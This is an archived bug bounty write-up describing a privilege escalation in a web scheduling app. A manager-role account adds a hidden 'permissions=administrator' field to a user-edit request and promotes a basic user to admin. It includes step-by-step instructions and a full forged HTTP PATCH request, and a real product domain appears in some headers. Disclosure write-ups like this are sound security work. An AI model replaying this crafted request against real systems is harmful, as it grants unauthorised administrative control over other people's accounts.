# Privilege escalation lets manager promote the user as admin

- **Source URL:** https://medium.com/@amitkhandebharad5/privilege-escalation-lets-manager-promote-the-user-as-admin-539524077386?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126143021/https://medium.com/@amitkhandebharad5/privilege-escalation-lets-manager-promote-the-user-as-admin-539524077386
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4025 (id 4025)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Privilege escalation lets manager promote the user as admin

whoami:

my name is Amit Khandebharad , I am a Certified Ethical Hacker (CEH) Master, possessing advanced expertise in ethical hacking and cybersecurity. As a self-learner, I am dedicated to continually expanding my knowledge and skills within the dynamic field of cybersecurity, staying current with the latest trends and technologies. My role as a passionate ethical hacker is underpinned by a fervent commitment to ethical principles and the responsible use of my skills to bolster digital security. I have substantiated my abilities through significant achievements,including securing the top position in the Zoho Bug Bounty Hall of Fame with the discovery of over 460 bugs, and being acknowledged as one of the top 1000 bug hunters on BugCrowd,and have more than 1200+ reputation on hackerone , and discovered total 1500+ bugs in various sites

=========================================================

## **STARTED**

info : only admin can promote the others users as admin. and there is 3 roles like admin manager and basic user

admin: have full access and can do everyting

manager : can edit the basic user and add the user as basic users

basic user: view only

manager can edit the other user but not able to promote or demote the admin

“when i see the functionality i always hold down on the middle level role and try to play with the higher level users try to promote demote or something else and here i also found some like i was able to archive the admin using the manager role”

but the program have policy that they only accept 1 bug of each type so i hold a little and though what if i was able to get admin privilege so i try to play with the basic user role while editing the basic user i notice there is a parameter for admin ‘&resource\_instance%5Baccount\_membership\_attributes%5D%5Bpermissions%5D=administrator’ is missing for basic user so i thought what if i add this parameter

so i quickly added the parameter and send the request and that user is promoted the admin

issue: here i am able to promote the user as admin using manager account

=================================================================================================

step1: login in manager account

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —

step2: here i need to intercept the request while editing any basic user

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —

now request is look like you can see there is “\[account\_membership\_attributes\]:permission is mission”

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —

step3: now changed request as but here ratherthan changing i forge the request as

POST /hi/org-url-id/human\_resources/user-id HTTP/2

Host: app.demo.com

Cookie: cookie

Content-Length: 934

Sec-Ch-Ua: “ Not A;Brand”;v=”99", “Chromium”;v=”90"

Accept: application/json, text/javascript, \*/\*; q=0.01

X-Csrf-Token: csrf-token

X-Requested-With: XMLHttpRequest

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Origin: [https://app.resourceguruapp.com](https://app.resourceguruapp.com)

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: [https://app.demo.com/hi/errere55/resources](https://app.resourceguruapp.com/hi/errere55/resources)

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

\_method=patch&resource\_instance%5Bresource\_type\_id%5D=resource-type-id&resource\_instance%5Baccount\_membership\_attributes%5D%5Battach\_user%5D=true&resource\_instance%5Baccount\_membership\_attributes%5D%5Bpermissions%5D=administrator&resource\_instance%5Baccount\_membership\_attributes%5D%5Badd\_own\_time\_off%5D=0&resource\_instance%5Baccount\_membership\_attributes%5D%5Bschedule%5D=view&resource\_instance%5Baccount\_membership\_attributes%5D%5Bbooking\_rights%5D=manage\_own&resource\_instance%5Baccount\_membership\_attributes%5D%5Bdowntime\_rights%5D=manage\_own&resource\_instance%5Baccount\_membership\_attributes%5D%5Bresource\_rights%5D=manage\_own&resource\_instance%5Baccount\_membership\_attributes%5D%5Bproject\_rights%5D=manage\_own&resource\_instance%5Baccount\_membership\_attributes%5D%5Bclient\_rights%5D=manage\_own&resource\_instance%5Baccount\_membership\_attributes%5D%5Breport\_rights%5D=view&resource\_instance%5Baccount\_membership\_attributes%5D%5Bid%5D=386353

//you have to replace the org-url-id , user-id want to promote , cookie and csrf token, and resource type id

forge request look like

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —

step4: now everything setup we just need to send the request

and we can see that the user is promote as admin

======================================================================================================

poc before exploitation user dont have access to tabs and also not allow to create the resources

after exploitation

now basic user is admin and got all access

after this i was like

COMMENT DOWN FOR VIDEO POC I WILL IF THIS NOT UNDERSTANBLE

And From now i am posting short write ups with my all post on twitter so do follow if you want to learn more like This
